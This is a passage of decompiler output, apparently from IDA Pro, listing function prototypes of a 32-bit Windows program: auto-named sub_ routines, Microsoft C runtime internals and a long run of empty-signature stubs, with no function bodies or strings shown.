void __thiscall sub_45BEB2(int this, int a2);
char __thiscall sub_45BF1A(_BYTE *this, char a2);
signed __int32 __cdecl sub_45BF27(int a1);
_DWORD *__thiscall sub_45C076(_DWORD *this, int a2, _DWORD *a3, int a4);
_DWORD *__thiscall sub_45C0BE(_DWORD *Block, char a2);
int __thiscall sub_45C0E8(_DWORD *this);
int __thiscall sub_45C0F0(_DWORD *this);
int __thiscall sub_45C0F4(_DWORD *this);
int __thiscall sub_45C0F8(int *this, int a2);
unsigned int __thiscall sub_45C150(int this);
unsigned __int32 __thiscall sub_45C166(_DWORD **this);
unsigned int __thiscall sub_45C173(_DWORD **this);
_DWORD *__thiscall sub_45C180(_DWORD *this, int a2, _DWORD *a3, int a4);
bool __thiscall sub_45C1B3(_WORD *this, int a2);
_DWORD *__thiscall sub_45C1D3(_DWORD *Block, char a2);
int __thiscall sub_45C1FD(_DWORD *this);
int __thiscall sub_45C22C(int this, __int32 a2);
int __thiscall sub_45C2EB(int (__thiscall ***this)(void *), int (__thiscall **a2)(void *));
char __thiscall sub_45C352(int this, int a2);
int __thiscall sub_45C3E0(_DWORD *this);
_BYTE *__thiscall sub_45C42E(_DWORD *this, int a2);
__int32 __thiscall sub_45C499(int this, int a2);
int __thiscall sub_45C506(int this, int a2, __int16 a3, int a4);
char __thiscall sub_45C53C(_DWORD *this);
int __thiscall sub_45C56A(_DWORD *this, int a2);
void __fastcall sub_45C58D(int a1);
int __thiscall sub_45C633(int this);
__int32 __thiscall sub_45C651(_DWORD *this, int a2);
__int32 __thiscall sub_45C6A2(int this, int a2, int a3);
LPVOID __thiscall sub_45C759(_DWORD *this, int a2, int a3);
std::regex_error *__thiscall sub_45C82C(std::regex_error *this, struct std::regex_error *a2);
int __thiscall sub_45C847(void *this);
void *__thiscall sub_45C8A8(void *Block, char a2);
BOOL __thiscall sub_45C8CA(_DWORD *this);
int __thiscall sub_45C8DB(_DWORD *this);
BOOL __thiscall sub_45C8DF(HANDLE *this);
BOOL __thiscall sub_45C8E9(_DWORD *this, int nPriority);
char __thiscall sub_45C901(_DWORD *this);
__int32 __thiscall sub_45C92C(int this);
int __stdcall sub_45C948(LPVOID lpThreadParameter); // idb
int *__thiscall sub_45C998(int *this, int a2, int a3, int a4, int a5);
bool __thiscall sub_45C9BD(unsigned int *this, int a2);
char __thiscall sub_45C9E7(int this, _DWORD *a2);
bool __thiscall sub_45CA32(_DWORD *this, _DWORD *a2);
_DWORD *__thiscall sub_45CA7E(_DWORD *this, int a2);
unsigned __int32 __thiscall sub_45CAA4(_DWORD *this, int a2);
int __thiscall sub_45CAF5(int *this);
int __thiscall sub_45CB42(_DWORD *this, int a2);
char __thiscall sub_45CB7C(_QWORD *this, __int64 a2);
char __thiscall sub_45CBB2(_DWORD *this, _DWORD *a2, int *a3, char a4);
int __thiscall sub_45CC41(_DWORD *this, int *a2, int a3);
int __thiscall sub_45CC8E(_DWORD *this, _DWORD *a2);
int __thiscall sub_45CCC9(_DWORD *this, _DWORD *a2);
char __stdcall sub_45CD07(_DWORD *a1, int *a2, char a3);
char __thiscall sub_45CD5E(_DWORD *this, _DWORD *a2, int *a3, char a4, int a5, char a6);
char __stdcall sub_45CDDF(_DWORD *a1, int a2);
char __thiscall sub_45CE1C(_DWORD *this, _DWORD *a2, int a3, int a4, char a5);
char __stdcall sub_45CE97(int *a1, int a2, char a3, char a4);
char __thiscall sub_45CEEA(_DWORD *this, int *a2, int a3, char a4, int a5, char a6);
PSLIST_ENTRY __thiscall sub_45CF78(_DWORD *this);
void __thiscall sub_45CFBB(int this, signed __int64 a2);
char __thiscall sub_45CFF4(_DWORD *this, _DWORD *a2);
bool __stdcall sub_45D030(int *a1, int *a2, char a3, char a4);
bool __stdcall sub_45D09D(int *a1, int *a2, char a3, char a4);
__int64 __thiscall sub_45D10B(_DWORD *this, int a2, int a3);
bool __thiscall sub_45D165(void *this);
char __thiscall sub_45D1E4(int this, int *a2, int *a3, char a4, char a5);
char __thiscall sub_45D481(int this, int *a2, int a3, char a4, char a5);
char __thiscall sub_45D6DF(int this, int *a2, _DWORD *a3, int *a4, char a5, int a6, char a7, char a8);
char __thiscall sub_45D7DB(int this, int *a2, _DWORD *a3, int a4, char a5, int a6, char a7, char a8);
char __thiscall sub_45D8E9(int this, int *a2, _DWORD *a3, int a4, char a5, int a6, char a7, char a8);
char __thiscall sub_45D9E8(int this, int *a2, int a3, int a4, unsigned int a5);
char __thiscall sub_45DAFB(int this, int *a2, int a3, int a4, unsigned int a5);
char __stdcall sub_45DC09(int *a1, _DWORD *a2, char a3);
char __stdcall sub_45DC9D(_DWORD *a1, _DWORD *a2);
char __stdcall sub_45DD1E(int *a1, _DWORD *a2, char a3);
unsigned int __thiscall sub_45DDB6(_DWORD *this, int a2, unsigned int a3);
unsigned int __thiscall sub_45DDDC(_DWORD *this, int a2, unsigned int a3);
bool __thiscall sub_45DE02(_DWORD *this, int a2, int a3, int a4, char a5);
char __thiscall sub_45DE8E(_DWORD **this, _DWORD *a2, _DWORD *a3);
char __thiscall sub_45DED0(int this, _DWORD *a2, _DWORD *a3, int *a4);
__int32 __thiscall sub_45DF3F(int *this);
void __thiscall sub_45DF56(_DWORD *this, _DWORD *a2);
int __thiscall sub_45DFA3(int this);
_DWORD *__thiscall sub_45DFB7(_DWORD *this, int a2, int a3);
_DWORD *__thiscall sub_45DFEE(_DWORD *Block, char a2);
// _DWORD __cdecl __std_exception_copy(_DWORD, _DWORD); weak
// _DWORD __cdecl __std_exception_destroy(_DWORD); weak
int sub_45E5F3();
// void __stdcall __noreturn _CxxThrowException(void *pExceptionObject, _ThrowInfo *pThrowInfo);
// void *__cdecl memmove(void *, const void *Src, size_t Size);
// void *__cdecl memset(void *, int Val, size_t Size);
// void *__cdecl memmove_0(void *, const void *Src, size_t Size);
// void *__cdecl memchr(const void *Buf, int Val, size_t MaxCount);
// int __cdecl memcmp(const void *Buf1, const void *Buf2, size_t Size);
// __vcrt_bool __cdecl __vcrt_uninitialize(__vcrt_bool Terminating);
// int __uncaught_exception(void); weak
char *__thiscall sub_4604CF(char *this, int a2);
char *__thiscall sub_4604EA(char *this, int a2);
_DWORD *__cdecl sub_4608A8(_DWORD *a1, int a2);
_DWORD *__cdecl sub_4608C4(_DWORD *a1, int a2);
// int __cdecl __RTDynamicCast(int, int, struct TypeDescriptor *, struct TypeDescriptor *, int); idb
int __cdecl sub_461F67(int a1);
// void __cdecl _invalid_parameter_noinfo();
// void __cdecl __noreturn _invalid_parameter_noinfo_noreturn();
// void __cdecl __noreturn _invoke_watson(const wchar_t *Expression, const wchar_t *FunctionName, const wchar_t *FileName, unsigned int LineNo, uintptr_t Reserved);
// void __thiscall __noreturn terminate(_DWORD); weak
// _LocaleUpdate *__thiscall _LocaleUpdate::_LocaleUpdate(_LocaleUpdate *__hidden this, struct __crt_locale_pointers *const); idb
// int __cdecl toupper(int C);
// int __cdecl __acrt_locale_get_ctype_array_value(const unsigned __int16 *const Locale_pctype_array, const int Char_value, const int Mask);
// int __cdecl _islower_l(int C, _locale_t Locale);
// int __cdecl sub_462458(int Char_value, struct __crt_locale_pointers *); idb
// int __cdecl _isupper_l(int C, _locale_t Locale);
// int __cdecl sub_4624C4(int Char_value); idb
int __cdecl sub_4624F8(int Char_value); // idb
int __cdecl sub_462529(int Char_value); // idb
int __cdecl sub_46255A(int Char_value); // idb
// errno_t __cdecl _localtime64_s(struct tm *Tm, const __time64_t *Time);
// int __cdecl __acrt_convert_wcs_mbs_cp<char,wchar_t,_lambda_62f6974d9771e494a5ea317cc32e971c_,__crt_win32_buffer_internal_dynamic_resizing>(LPCCH lpMultiByteStr, struct __crt_win32_buffer_empty_debug_info *, int, UINT CodePage); idb
// int __cdecl __acrt_convert_wcs_mbs_cp<wchar_t,char,_lambda_0fec1a7b3f42a53036604e18c2d5e07e_,__crt_win32_buffer_no_resizing>(LPCWCH lpWideCharStr, int, int, UINT CodePage); idb
int __cdecl sub_46299E(LPCCH lpMultiByteStr, struct __crt_win32_buffer_empty_debug_info *a2, UINT CodePage); // idb
int __cdecl sub_4629BB(LPCWCH lpWideCharStr, int a2, UINT CodePage); // idb
// int unknown_libname_91(void); weak
int __thiscall sub_462A19(void **this, int a2);
// int __cdecl __crt_win32_buffer_internal_dynamic_resizing::allocate(void **const, size_t Size, const struct __crt_win32_buffer_empty_debug_info *); idb
void *__cdecl j___W_Gettnames();
// size_t __cdecl strftime(char *Buffer, size_t SizeInBytes, const char *Format, const struct tm *Tm);
// _DWORD __cdecl common_timespec_get<&void __acrt_GetSystemTimePreciseAsFileTime(_FILETIME *),_timespec64>(_DWORD, _DWORD); weak
__int64 __cdecl sub_462E7B(__int64 *a1);
int __cdecl sub_46310D(int a1);
// void __cdecl __noreturn _exit(int Code);
// intptr_t __cdecl _loaddll(char *FileName);
// errno_t __cdecl wcscpy_s(wchar_t *Destination, rsize_t SizeInWords, const wchar_t *Source);
// errno_t __cdecl wcscat_s(wchar_t *Destination, rsize_t SizeInWords, const wchar_t *Source);
// int __cdecl rand();
// void __cdecl srand(unsigned int Seed);
// int __cdecl fputc(int Character, FILE *Stream);
// FILE *__cdecl _wfopen(const wchar_t *FileName, const wchar_t *Mode);
// FILE *__cdecl fopen(const char *FileName, const char *Mode);
// FILE *__cdecl __acrt_iob_func(unsigned int Ix);
// int __cdecl fclose(FILE *Stream);
// int __cdecl remove(const char *FileName);
// _DWORD __stdcall __crt_seh_guarded_call<unsigned int>::operator()<_lambda_4ac01c32aa5b53846f05d0620572872e_,_lambda_5856287d7ecd2be6c9197bb4007c3f6e_ &,_lambda_e7a9868ed898c75c0f0637692d94351a_>(_DWORD, _DWORD, _DWORD); weak
int __cdecl sub_4638B1(int a1, int a2, int *a3, unsigned int a4, unsigned int a5, int a6, struct __crt_locale_pointers *a7, int a8);
int __cdecl sub_463999(int a1, int a2, int *a3, unsigned int a4, int a5, struct __crt_locale_pointers *a6, int a7);
int __cdecl sub_463B17(int a1, int a2, int *a3, unsigned int a4, int a5, struct __crt_locale_pointers *a6, int a7);
// _DWORD __stdcall __crt_stdio_output::formatting_buffer::ensure_buffer_is_big_enough<char>(_DWORD); weak
// _DWORD __stdcall unknown_libname_94(_DWORD, _DWORD, char); weak
// _DWORD __stdcall unknown_libname_95(_DWORD, _DWORD, _DWORD, char); weak
// _DWORD __cdecl sub_463EF2(_DWORD, _DWORD, _DWORD, _DWORD); weak
// _DWORD __cdecl __crt_stdio_output::write_multiple_characters<__crt_stdio_output::string_output_adapter<char>,char>(_DWORD, _DWORD, _DWORD, _DWORD); weak
// _DWORD __stdcall unknown_libname_96(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); weak
// void __thiscall __crt_stdio_output::formatting_buffer::~formatting_buffer(__crt_stdio_output::formatting_buffer *__hidden this); idb
// _DWORD __stdcall unknown_libname_98(char, _DWORD); weak
// _DWORD __stdcall sub_464174(char, _DWORD); weak
// _DWORD __stdcall unknown_libname_99(_DWORD); weak
int __thiscall sub_464398(int this);
int __thiscall sub_4644BC(int this);
// int __thiscall unknown_libname_100(_DWORD); weak
char __thiscall sub_46460D(void *this);
char __thiscall sub_46462C(char *this);
char __thiscall sub_46464B(int this);
char __thiscall sub_464685(char *this);
// _DWORD __stdcall unknown_libname_101(_DWORD); weak
// _DWORD __stdcall unknown_libname_102(_DWORD); weak
// int __thiscall sub_464780(_DWORD); weak
char __thiscall sub_4647A6(_BYTE *this);
char __thiscall sub_4648F4(_BYTE *this);
char __thiscall sub_464A42(int this);
char __thiscall sub_464C74(int this);
char __thiscall sub_464EA6(int this);
// int __cdecl __crt_stdio_output::to_integer_size(_DWORD); weak
// int __thiscall unknown_libname_103(_DWORD); weak
// int __thiscall unknown_libname_104(_DWORD); weak
// _DWORD __stdcall sub_4650CE(_DWORD); weak
char __thiscall sub_46515E(int this, int a2, char a3);
// int __thiscall unknown_libname_105(_DWORD); weak
char __thiscall sub_465323(_DWORD *this);
char __thiscall sub_465342(_DWORD *this);
// int __thiscall unknown_libname_106(_DWORD); weak
// int __thiscall unknown_libname_108(_DWORD); weak
// int __thiscall unknown_libname_109(_DWORD); weak
// _DWORD __stdcall __crt_stdio_output::string_output_adapter<char>::write_character(char, _DWORD); weak
// _DWORD __stdcall __crt_stdio_output::stream_output_adapter<char>::write_character_without_count_update(char); weak
// _DWORD __stdcall unknown_libname_110(_DWORD); weak
// _DWORD __stdcall sub_4655CF(_DWORD); weak
// _DWORD __stdcall __crt_stdio_output::stream_output_adapter<char>::write_string(_DWORD, _DWORD, _DWORD, _DWORD); weak
// int __stdcall unknown_libname_111(void *Src, int, int, int); idb
int __cdecl sub_4657A7(int a1, int a2, int a3, int a4, int a5, int a6);
int __cdecl sub_46582A(int a1, int a2, int *a3, int a4, int a5, int a6, struct __crt_locale_pointers *a7, int a8);
int __cdecl sub_465851(int a1, int a2, int *a3, int a4, int a5, struct __crt_locale_pointers *a6, int a7);
// int __cdecl _setmode(int FileHandle, int Mode);
// char *__cdecl strncpy(char *Destination, const char *Source, size_t Count);
// int __cdecl _fileno(FILE *Stream);
// size_t __cdecl fwrite(const void *Buffer, size_t ElementSize, size_t ElementCount, FILE *Stream);
// char *__cdecl getenv(const char *VarName);
int __stdcall sub_4660C4(_DWORD *a1, int a2, _DWORD *a3);
// int __thiscall _lambda_2116bde18c9e5f34230805ea4a4660ed_::operator()(_DWORD); weak
// char *__cdecl setlocale(int Category, const char *Locale);
// void __cdecl free(void *Block);
// void *__cdecl malloc(size_t Size);
// void __cdecl __noreturn abort();
// _DWORD __cdecl __acrt_lock(_DWORD); weak
// _DWORD __cdecl __acrt_unlock(_DWORD); weak
// double __cdecl frexp(double X, int *Y);
// double __cdecl ldexp(double X, int Y);
// _DWORD __cdecl __acrt_errno_map_os_error(_DWORD); weak
// unsigned int *__cdecl __doserrno();
// int *__cdecl _errno();
// _DWORD __cdecl __crt_strtox::assemble_floating_point_value_t<float>(char, _DWORD, _DWORD, _DWORD, _DWORD); weak
// _DWORD __cdecl __crt_strtox::assemble_floating_point_value_t<double>(char, _DWORD, _DWORD, _DWORD, _DWORD); weak
double __cdecl sub_466898(int a1, _DWORD *a2, struct __crt_locale_pointers *a3);
double __cdecl sub_466927(int a1, _DWORD *a2, struct __crt_locale_pointers *a3);
// _DWORD __cdecl unknown_libname_112(_DWORD, _DWORD, _DWORD); weak
// int __cdecl __crt_strtox::parse_floating_point<__crt_strtox::c_string_character_source<char>,_LDBL12>(_locale_t Locale, int, int, int); idb
// int __cdecl __crt_strtox::parse_floating_point<__crt_strtox::c_string_character_source<char>,_LDBL12>(_locale_t Locale, int, int, int); idb
int __cdecl sub_466F20(char *a1, char **a2, char *a3);
// double *__thiscall __crt_strtox::floating_point_value::as_double(__crt_strtox::floating_point_value *__hidden this); idb
// float *__thiscall __crt_strtox::floating_point_value::as_float(__crt_strtox::floating_point_value *__hidden this); idb
// void __cdecl __crt_strtox::assemble_floating_point_infinity(__crt_strtox *__hidden this, __crt_strtox::floating_point_value *, const struct __crt_strtox::floating_point_value *); idb
int __cdecl sub_467488(unsigned __int64 a1, int a2, __crt_strtox *a3, char a4, __crt_strtox::floating_point_value *a5);
// void __cdecl __crt_strtox::assemble_floating_point_zero(__crt_strtox *__hidden this, __crt_strtox::floating_point_value *, const struct __crt_strtox::floating_point_value *); idb
// unsigned __int64 __thiscall __crt_strtox::floating_point_value::denormal_mantissa_mask(__crt_strtox::floating_point_value *__hidden this); idb
// unsigned __int64 __thiscall __crt_strtox::floating_point_value::normal_mantissa_mask(__crt_strtox::floating_point_value *__hidden this); idb
// _DWORD __stdcall __crt_strtox::c_string_character_source<char>::unget(char); weak
void __cdecl sub_469D27(int a1, _DWORD *a2);
void __cdecl sub_469D3E(int a1, _DWORD *a2);
// struct lconv *__cdecl localeconv();
// const unsigned __int16 *__cdecl __pctype_func();
// bool __cdecl expand_time(_locale_t Locale, wchar_t, const struct tm *, wchar_t **, unsigned int *, const struct __crt_lc_time_data *, bool); idb
// void *__cdecl _W_Gettnames();
int __cdecl sub_46C024(wchar_t *a1, int a2, wchar_t *a3, struct tm *a4, struct __crt_lc_time_data *a5);
int __cdecl sub_46C044(wchar_t *a1, int a2, wchar_t *a3, struct tm *a4, struct __crt_lc_time_data *a5, struct __crt_locale_pointers *a6);
int __cdecl sub_46C4B5(int a1);
int sub_46C9C3();
// int common_initialize_environment_nolock<char>(void); weak
// int __cdecl unknown_libname_115(void *Block); idb
// int initialize_environment_by_cloning_nolock<char>(void); weak
void *__cdecl sub_46CD48(void **a1);
void *__cdecl sub_46CD63(void **a1);
// int __dcrt_uninitialize_environments_nolock(void); weak
int __stdcall sub_46CDBF(_DWORD *a1, int a2, _DWORD *a3);
int __stdcall sub_46CE1A(_DWORD *a1, int a2, _DWORD *a3);
// int __thiscall _lambda_22ebabd17bc4fa466a2aca6d8deb888d_::operator()(_DWORD); weak
// int __thiscall unknown_libname_117(_DWORD); weak
int __cdecl sub_46D078(_onexit_t Function); // idb
// int __cdecl _register_onexit_function(_onexit_table_t *Table, _onexit_t Function);
char sub_46D117();
char sub_46D13E();
__vcrt_bool sub_46D174();
int sub_46D254();
int __cdecl sub_46D25A(int a1);
int __cdecl sub_46D281(int a1);
// int __cdecl __acrt_copy_locale_name(wchar_t *Source); idb
__int32 sub_46D74F();
// int __cdecl _expandlocale(wchar_t *Source, wchar_t *Destination, rsize_t SizeInWords, wchar_t *, rsize_t, int); idb
UINT __cdecl sub_46E2E7(UINT *a1, int a2, wchar_t *a3);
int sub_46EADE();
// int __cdecl _set_new_mode(int NewMode);
int *sub_46EB14();
// int __cdecl common_flush_all(bool); idb
int sub_46EE03();
// int __acrt_getptd(void); weak
// int __acrt_getptd_noexit(void); weak
struct __crt_locale_data *__cdecl sub_47019F(int a1, struct __crt_locale_data **a2);
struct __crt_multibyte_data *__cdecl sub_4701CC(int a1, struct __crt_multibyte_data **a2);
int *sub_4702EF();
int *sub_4702F5();
int *sub_4702FB();
int sub_470301();
int __cdecl sub_470307(_DWORD *a1);
int __cdecl sub_470333(_DWORD *a1);
int __cdecl sub_47035F(_DWORD *a1);
// void __cdecl _free_base(void *Block);
// void *__cdecl _malloc_base(size_t Size);
// int __cdecl __acrt_WideCharToMultiByte(UINT CodePage, int, LPCWCH lpWideCharStr, int cchWideChar, LPSTR lpMultiByteStr, int cbMultiByte, int, int); idb
BOOL __stdcall LocaleEnumProc(LPWSTR a1); // idb
// _DWORD __stdcall _lambda_29d3c280b90b41c2ae070ffca879996a_::operator()(_DWORD); weak
int sub_4710C3();
int sub_4710DD();
int sub_4710F7();
int sub_471111();
int sub_47112B();
int sub_471145();
int sub_47115F();
// int __cdecl try_get_function(_DWORD, _DWORD, _DWORD, _DWORD); weak
int __stdcall sub_4712C3(int a1);
int __stdcall sub_4716EA(wchar_t *a1, DWORD dwMapFlags, LPCWSTR lpSrcStr, int cchSrc, LPWSTR lpDestStr, int cchDest, int a7, int a8, int a9); // idb
// int __stdcall __acrt_LocaleNameToLCID(wchar_t *, int); idb
int __cdecl sub_47184C(int a1, FILE *Stream); // idb
// int __cdecl write_buffer_nolock<char>(int, FILE *Stream); idb
// int __cdecl stream_is_at_end_of_file_nolock(_DWORD); weak
int __cdecl sub_471AB2(int a1, FILE *a2);
// void *__cdecl _calloc_base(size_t Count, size_t Size);
// _DWORD __stdcall __crt_seh_guarded_call<int>::operator()<_lambda_218ce3db14220d0be481dae8ef3383b6_,_lambda_628dfdc04ba53c8bfc02c9951375f3f5_ &,_lambda_57dc472bd5c9d5f3b2cbca59b8a843ae_>(_DWORD, _DWORD, _DWORD); weak
int __cdecl sub_4726B2(int a1);
// int __cdecl mbtowc(wchar_t *DstCh, const char *SrcCh, size_t SrcSizeInBytes);
int __cdecl sub_472B63(double *a1, char *Str, unsigned int a3, char *a4, unsigned int a5, signed int Size, unsigned __int8 a7, unsigned int a8, struct __crt_locale_pointers *a9);
// int __cdecl fp_format_e(const double *const, char *const, unsigned int, char *const, unsigned int, int, bool, unsigned int, struct __crt_locale_pointers *const); idb
char __cdecl sub_47349C(FILE *Stream);
// _DWORD __cdecl __acrt_lowio_lock_fh(_DWORD); weak
// _DWORD __cdecl __acrt_lowio_unlock_fh(_DWORD); weak
DWORD *__cdecl sub_4739BD(DWORD *a1, int a2, char *a3, int a4);
// int __cdecl write_double_translated_unicode_nolock(_DWORD, _DWORD, _DWORD); weak
// bool __cdecl write_requires_double_translation_nolock(int FileHandle); idb
// int __cdecl write_text_ansi_nolock(_DWORD, _DWORD, _DWORD, _DWORD); weak
// int __cdecl write_text_utf16le_nolock(_DWORD, _DWORD, _DWORD, _DWORD); weak
// int __cdecl write_text_utf8_nolock(_DWORD, _DWORD, _DWORD, _DWORD); weak
int __cdecl sub_474136(int FileHandle, const void *a2, int a3);
int __cdecl sub_474228(int FileHandle, const void *a2, int a3);
// void (__cdecl **__cdecl get_global_action_nolock(int))(int); idb
// struct __crt_signal_action_t *__cdecl siglookup(int, struct __crt_signal_action_t *const); idb
// int *__cdecl __fpecode();
int __cdecl sub_474C2E(int a1);
// int __cdecl fegetround();
// int __cdecl __acrt_GetLocaleInfoA(struct __crt_locale_pointers *, int, wchar_t *, LCTYPE LCType, int); idb
// int __cdecl __acrt_GetStringTypeA(struct __crt_locale_pointers *, DWORD dwInfoType, LPCCH lpMultiByteStr, int cbMultiByte, LPWORD lpCharType, UINT CodePage, int); idb
// struct __crt_multibyte_data *__cdecl update_thread_multibyte_data_internal(struct __acrt_ptd *const, struct __crt_multibyte_data **const); idb
struct __crt_multibyte_data *sub_477CE0();
// _DWORD __cdecl copy_environment<char>(_DWORD); weak
int sub_4782F8();
char sub_4783F0();
// _DWORD __cdecl sub_478948(_DWORD); weak
int __cdecl sub_4789B1(int a1);
int sub_479435();
// _DWORD __cdecl _updatetlocinfoEx_nolock(_DWORD, _DWORD); weak
// int __cdecl _isatty(int FileHandle);
// int __cdecl _lseeki64_nolock(int FileHandle, LARGE_INTEGER liDistanceToMove, DWORD dwMoveMethod); idb
// _DWORD __cdecl __acrt_stdio_allocate_buffer_nolock(_DWORD); weak
int __cdecl sub_47B8B6(char *String1, char *String2, size_t MaxCount); // idb
// int __cdecl _strnicmp_l(const char *String1, const char *String2, size_t MaxCount, _locale_t Locale);
// unsigned int __cdecl __crt_mbstring::__mbsrtowcs_utf8(__crt_mbstring *__hidden this, wchar_t *, const char **, unsigned int, struct _Mbstatet *); idb
int __cdecl sub_47DACA(int FileHandle, char *a2, int a3);
unsigned int __cdecl sub_47DC2B(int FileHandle, char *a2, int a3);
unsigned int __cdecl sub_47E9A8(unsigned int a1);
int __cdecl sub_47F03E(wchar_t Source, struct __crt_locale_pointers *a2); // idb
// _DWORD __cdecl sub_47F7E0(_DWORD, _DWORD, _DWORD); weak
// void __cdecl __dcrt_lowio_initialize_console_output(); idb
BOOL sub_47FEAC();
// int __cdecl __acrt_LCMapStringW(wchar_t *, DWORD dwMapFlags, wchar_t *Source, size_t MaxCount, LPWSTR lpDestStr, int cchDest); idb
int __cdecl sub_480294(double a1);
// int __cdecl _ceil_default(double); idb
// char *__cdecl strrchr(const char *Str, int Ch);
// unsigned __int64 __usercall sub_481093@<edx:eax>(unsigned __int64 a1@<edx:eax>);
// __m128 _libm_sse2_sin_precise(void); weak
// int __usercall sub_481850@<eax>(int a1@<ebp>);
// int __usercall sub_481880@<eax>(int a1@<ebp>);
// void __usercall sub_481888(int a1@<ebp>);
// void __usercall sub_481910(int a1@<ebp>);
// void __usercall sub_481DE0(int a1@<ebp>);
// int __usercall sub_481E10@<eax>(int a1@<ebp>);
// int __usercall sub_481E18@<eax>(int a1@<ebp>);
// void __usercall sub_481E20(int a1@<ebp>);
// int __usercall sub_481E2F@<eax>(int a1@<ebp>);
// void __usercall sub_4830F0(int a1@<ebp>);
void __cdecl sub_486C80(); // idb
void __cdecl sub_486CC0(); // idb
void __cdecl sub_486D20(); // idb
void __cdecl sub_486D80(); // idb
void __cdecl sub_486DE0(); // idb
void __cdecl sub_486E40(); // idb
void __cdecl sub_486EA0(); // idb
void __cdecl sub_486F00(); // idb
void __cdecl sub_486F60(); // idb
void __cdecl sub_486FC0(); // idb
void __cdecl sub_487020(); // idb
void __cdecl sub_487080(); // idb
void __cdecl sub_4870E0(); // idb
void __cdecl sub_487140(); // idb
void __cdecl sub_4871A0(); // idb
void __cdecl sub_487200(); // idb
void __cdecl sub_487260(); // idb
void __cdecl sub_4872C0(); // idb
void __cdecl sub_487320(); // idb
void __cdecl sub_487380(); // idb
void __cdecl sub_4873E0(); // idb
void __cdecl sub_487440(); // idb
void __cdecl sub_4874A0(); // idb
void __cdecl sub_487500(); // idb
void __cdecl sub_487560(); // idb
void __cdecl sub_4875C0(); // idb
void __cdecl sub_487620(); // idb
void __cdecl sub_487680(); // idb
void __cdecl sub_4876E0(); // idb
void __cdecl sub_487740(); // idb
void __cdecl sub_4877A0(); // idb
void __cdecl sub_487800(); // idb
void __cdecl sub_487860(); // idb
void __cdecl sub_4878C0(); // idb
void __cdecl sub_487920(); // idb
void __cdecl sub_487980(); // idb
void __cdecl sub_4879E0(); // idb
void __cdecl sub_487A40(); // idb
void __cdecl sub_487AA0(); // idb
void __cdecl sub_487B00(); // idb
void __cdecl sub_487B60(); // idb
void __cdecl sub_487BC0(); // idb
void __cdecl sub_487C20(); // idb
void __cdecl sub_487C80(); // idb
void __cdecl sub_487CE0(); // idb
void __cdecl sub_487D40(); // idb
void __cdecl sub_487DA0(); // idb
void __cdecl sub_487E00(); // idb
void __cdecl sub_487E60(); // idb
void __cdecl sub_487EC0(); // idb
void __cdecl sub_487F20(); // idb
void __cdecl sub_487F80(); // idb
void __cdecl sub_487FE0(); // idb
void __cdecl sub_488040(); // idb
void __cdecl sub_4880A0(); // idb
void __cdecl sub_488100(); // idb
void __cdecl sub_488160(); // idb
void __cdecl sub_4881C0(); // idb
void __cdecl sub_488220(); // idb
void __cdecl sub_488280(); // idb
void __cdecl sub_4882E0(); // idb
void __cdecl sub_488340(); // idb
void __cdecl sub_4883A0(); // idb
void __cdecl sub_488400(); // idb
void __cdecl sub_488460(); // idb
void __cdecl sub_4884C0(); // idb
void __cdecl sub_488520(); // idb
void __cdecl sub_488580(); // idb
void __cdecl sub_4885E0(); // idb
void __cdecl sub_488640(); // idb
void __cdecl sub_4886A0(); // idb
void __cdecl sub_488700(); // idb
void __cdecl sub_488760(); // idb
void __cdecl sub_4887C0(); // idb
void __cdecl sub_488820(); // idb
void __cdecl sub_488880(); // idb
void __cdecl sub_4888E0(); // idb
void __cdecl sub_488940(); // idb
void __cdecl sub_4889A0(); // idb
void __cdecl sub_488A00(); // idb
void __cdecl sub_488A60(); // idb
void __cdecl sub_488AC0(); // idb
void __cdecl sub_488B20(); // idb
void __cdecl sub_488B80(); // idb
void __cdecl sub_488BE0(); // idb
void __cdecl sub_488C40(); // idb
void __cdecl sub_488CA0(); // idb
void __cdecl sub_488D00(); // idb
void __cdecl sub_488D60(); // idb
void __cdecl sub_488DC0(); // idb
void __cdecl sub_488E20(); // idb
void __cdecl sub_488E80(); // idb
void __cdecl sub_488EE0(); // idb
void __cdecl sub_488F40(); // idb
void __cdecl sub_488FA0(); // idb
void __cdecl sub_489000(); // idb
void __cdecl sub_489060(); // idb
void __cdecl sub_4890C0(); // idb
void __cdecl sub_489120(); // idb
void __cdecl sub_489180(); // idb
void __cdecl sub_4891E0(); // idb
void __cdecl sub_489240(); // idb
void __cdecl sub_4892A0(); // idb
void __cdecl sub_489300(); // idb
void __cdecl sub_489360(); // idb
void __cdecl sub_4893C0(); // idb
void __cdecl sub_489420(); // idb
void __cdecl sub_489480(); // idb
void __cdecl sub_4894E0(); // idb
void __cdecl sub_489540(); // idb
void __cdecl sub_4895A0(); // idb
void __cdecl sub_489600(); // idb
void __cdecl sub_489660(); // idb
void __cdecl sub_4896C0(); // idb
void __cdecl sub_489720(); // idb
void __cdecl sub_489780(); // idb
void __cdecl sub_4897E0(); // idb
void __cdecl sub_489840(); // idb
void __cdecl sub_4898A0(); // idb
void __cdecl sub_489900(); // idb
void __cdecl sub_489960(); // idb
void __cdecl sub_4899C0(); // idb
void __cdecl sub_489A20(); // idb
void __cdecl sub_489A80(); // idb
void __cdecl sub_489AE0(); // idb
void __cdecl sub_489B40(); // idb
void __cdecl sub_489BA0(); // idb
void __cdecl sub_489C00(); // idb
void __cdecl sub_489C60(); // idb
void __cdecl sub_489CC0(); // idb
void __cdecl sub_489D20(); // idb
void __cdecl sub_489D80(); // idb
void __cdecl sub_489DE0(); // idb
void __cdecl sub_489E40(); // idb
void __cdecl sub_489EA0(); // idb
void __cdecl sub_489F00(); // idb
void __cdecl sub_489F60(); // idb
void __cdecl sub_489FC0(); // idb
void __cdecl sub_48A020(); // idb
void __cdecl sub_48A080(); // idb
void __cdecl sub_48A0E0(); // idb
void __cdecl sub_48A140(); // idb
void __cdecl sub_48A1A0(); // idb
void __cdecl sub_48A200(); // idb
void __cdecl sub_48A260(); // idb
void __cdecl sub_48A2C0(); // idb
void __cdecl sub_48A320(); // idb
void __cdecl sub_48A380(); // idb
void __cdecl sub_48A3E0(); // idb
void __cdecl sub_48A440(); // idb
void __cdecl sub_48A4A0(); // idb
void __cdecl sub_48A500(); // idb
void __cdecl sub_48A560(); // idb
void __cdecl sub_48A5C0(); // idb
void __cdecl sub_48A620(); // idb
void __cdecl sub_48A680(); // idb
void __cdecl sub_48A6E0(); // idb
void __cdecl sub_48A740(); // idb
void __cdecl sub_48A7A0(); // idb
void __cdecl sub_48A800(); // idb
void __cdecl sub_48A860(); // idb
void __cdecl sub_48A8C0(); // idb
void __cdecl sub_48A920(); // idb
void __cdecl sub_48A980(); // idb
